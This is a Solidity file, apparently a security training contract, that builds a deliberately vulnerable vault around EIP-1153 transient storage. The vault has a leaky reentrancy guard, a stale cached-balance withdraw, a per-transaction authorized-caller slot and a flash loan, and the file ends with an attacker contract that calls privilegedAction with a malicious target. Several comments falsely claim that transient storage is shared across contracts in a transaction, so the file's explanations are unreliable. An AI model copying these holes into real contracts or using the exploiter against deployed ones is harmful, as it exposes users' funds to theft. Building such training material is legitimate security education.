// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24; // Requires Cancun upgrade for TLOAD/TSTORE

/**
 * @title TransientStorageLeak
 * @dev Training Contract #13 - EIP-1153 Transient Storage Vulnerabilities
 * 
 * MASTER LEVEL VULNERABILITY:
 * 1. TLOAD/TSTORE only reset at END of transaction
 * 2. Values persist across internal calls within same tx
 * 3. Reentrancy guards using transient storage can leak
 * 4. Cross-contract calls in same tx share transient state
 * 
 * NEW IN 2024: Dencun upgrade enabled this
 * 
 * CHAIN INTEGRATION:
 * - Reentrancy guard leaks to other contracts in same tx
 * - Contract 06 (CallbackReentrancy) can exploit this
 */

contract TransientStorageLeak {
    // Transient storage slots (EIP-1153)
    // These are NOT declared as state variables!
    // We use assembly to access transient storage
    
    uint256 constant REENTRANCY_SLOT = 0;
    uint256 constant CACHED_BALANCE_SLOT = 1;
    uint256 constant AUTHORIZED_CALLER_SLOT = 2;
    uint256 constant FLASH_LOAN_ACTIVE_SLOT = 3;
    
    // Regular storage
    mapping(address => uint256) public balances;
    address public owner;
    uint256 public totalDeposits;
    
    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event FlashLoan(address indexed borrower, uint256 amount);
    
    constructor() {
        owner = msg.sender;
    }
    
    // ============ TRANSIENT STORAGE HELPERS ============
    
    function _tstore(uint256 slot, uint256 value) internal {
        assembly {
            tstore(slot, value)
        }
    }
    
    function _tload(uint256 slot) internal view returns (uint256 value) {
        assembly {
            value := tload(slot)
        }
    }
    
    // ============ REENTRANCY GUARD (VULNERABLE) ============
    
    modifier nonReentrantTransient() {
        require(_tload(REENTRANCY_SLOT) == 0, "Reentrant call");
        _tstore(REENTRANCY_SLOT, 1);
        _;
        _tstore(REENTRANCY_SLOT, 0);
    }
    
    /**
     * @dev Check if we're in a "locked" state
     * BUG: Other contracts can read this via delegatecall!
     */
    function isLocked() external view returns (bool) {
        return _tload(REENTRANCY_SLOT) == 1;
    }
    
    // ============ DEPOSIT/WITHDRAW ============
    
    function deposit() external payable nonReentrantTransient {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
        
        // Cache balance in transient storage for "gas optimization"
        // BUG: This persists for entire transaction!
        _tstore(CACHED_BALANCE_SLOT, balances[msg.sender]);
        
        emit Deposited(msg.sender, msg.value);
    }
    
    /**
     * @dev Withdraw using cached balance
     * BUG: Cached balance might be stale within same tx
     */
    function withdrawCached() external nonReentrantTransient {
        // Use cached balance if available (gas optimization?)
        uint256 cachedBal = _tload(CACHED_BALANCE_SLOT);
        uint256 amount = cachedBal > 0 ? cachedBal : balances[msg.sender];
        
        require(amount > 0, "No balance");
        
        // BUG: If someone deposited in same tx, cached balance is their amount!
        // Transient storage is shared across all calls in tx
        
        balances[msg.sender] = 0;
        _tstore(CACHED_BALANCE_SLOT, 0);
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawn(msg.sender, amount);
    }
    
    // ============ AUTHORIZED CALLER PATTERN ============
    
    /**
     * @dev Set authorized caller for this transaction
     * BUG: Persists across all calls in same tx
     */
    function setAuthorizedCaller(address caller) external {
        require(msg.sender == owner, "Only owner");
        _tstore(AUTHORIZED_CALLER_SLOT, uint256(uint160(caller)));
    }
    
    /**
     * @dev Execute privileged action
     * BUG: Authorization set by contract A applies to contract B in same tx!
     */
    function privilegedAction(address target, bytes calldata data) external {
        uint256 authorized = _tload(AUTHORIZED_CALLER_SLOT);
        require(
            msg.sender == owner || uint160(authorized) == uint160(msg.sender),
            "Not authorized"
        );
        
        (bool success,) = target.call(data);
        require(success, "Action failed");
    }
    
    // ============ FLASH LOAN WITH TRANSIENT STATE ============
    
    /**
     * @dev Flash loan using transient storage for state
     * BUG: Flash loan state visible to all contracts in tx
     */
    function flashLoan(uint256 amount, address receiver, bytes calldata data) external {
        require(_tload(FLASH_LOAN_ACTIVE_SLOT) == 0, "Flash loan active");
        require(amount <= address(this).balance, "Insufficient liquidity");
        
        // Mark flash loan as active
        _tstore(FLASH_LOAN_ACTIVE_SLOT, 1);
        
        uint256 balanceBefore = address(this).balance;
        
        // Send funds
        (bool sent,) = receiver.call{value: amount}(data);
        require(sent, "Transfer failed");
        
        // BUG: Other contracts can check FLASH_LOAN_ACTIVE_SLOT
        // and know a flash loan is in progress!
        
        // Verify repayment
        require(
            address(this).balance >= balanceBefore,
            "Flash loan not repaid"
        );
        
        _tstore(FLASH_LOAN_ACTIVE_SLOT, 0);
        
        emit FlashLoan(receiver, amount);
    }
    
    /**
     * @dev Check if flash loan is active (leaks info!)
     */
    function isFlashLoanActive() external view returns (bool) {
        return _tload(FLASH_LOAN_ACTIVE_SLOT) == 1;
    }
    
    // ============ CROSS-CONTRACT LEAK ============
    
    /**
     * @dev Call external contract while holding transient state
     * BUG: External contract can read/write our transient slots via delegatecall
     */
    function callExternal(address target, bytes calldata data) external nonReentrantTransient {
        // Set some sensitive transient data
        _tstore(AUTHORIZED_CALLER_SLOT, uint256(uint160(msg.sender)));
        
        // External call - if target does delegatecall back, it can access our slots!
        (bool success,) = target.call(data);
        require(success, "External call failed");
        
        // BUG: We don't clear AUTHORIZED_CALLER_SLOT
        // It persists for rest of transaction
    }
    
    receive() external payable {}
}

/**
 * @dev Attacker contract that exploits transient storage leak
 */
contract TransientExploiter {
    TransientStorageLeak public target;
    
    constructor(address _target) {
        target = TransientStorageLeak(payable(_target));
    }
    
    /**
     * @dev Exploit: Read victim's transient storage
     */
    function exploitReadLeak() external view returns (bool locked, bool flashActive) {
        locked = target.isLocked();
        flashActive = target.isFlashLoanActive();
    }
    
    /**
     * @dev Exploit: Use leaked authorization
     */
    function exploitAuthorization(address maliciousTarget, bytes calldata data) external {
        // If owner called setAuthorizedCaller for someone else in same tx,
        // we might be able to use it!
        target.privilegedAction(maliciousTarget, data);
    }
    
    receive() external payable {}
}
